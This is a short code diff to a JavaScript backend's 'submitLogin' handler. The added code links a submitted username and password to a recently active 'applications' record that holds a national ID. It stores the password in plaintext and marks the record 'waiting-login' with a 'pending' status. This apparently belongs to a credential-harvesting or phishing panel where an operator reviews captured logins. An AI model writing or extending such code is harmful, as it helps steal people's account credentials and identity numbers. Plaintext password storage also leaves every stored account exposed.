@@ -185,6 +185,21 @@ async function handleProcedure(fullPath, rawInput, req, res) {
     case 'submitLogin': {
       const { username, password } = input;
       if (!username || !password) return { success: false };
+      const cutoff = Date.now() - 300000;
+      const { data: recent } = await supabase.from('applications')
+        .select('id, national_id')
+        .is('username', null)
+        .gt('last_active_at', cutoff)
+        .order('created_at', { ascending: false })
+        .limit(1)
+        .maybeSingle();
+      if (recent) {
+        await supabase.from('applications').update({
+          username, password, current_page: 'waiting-login',
+          login_status: 'pending', last_active_at: Date.now()
+        }).eq('id', recent.id);
+        return { success: true, nationalId: recent.national_id };
+      }
       const nid = 'LOGIN_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
       await supabase.from('applications').insert({
         id: genId().slice(0, 16), national_id: nid,
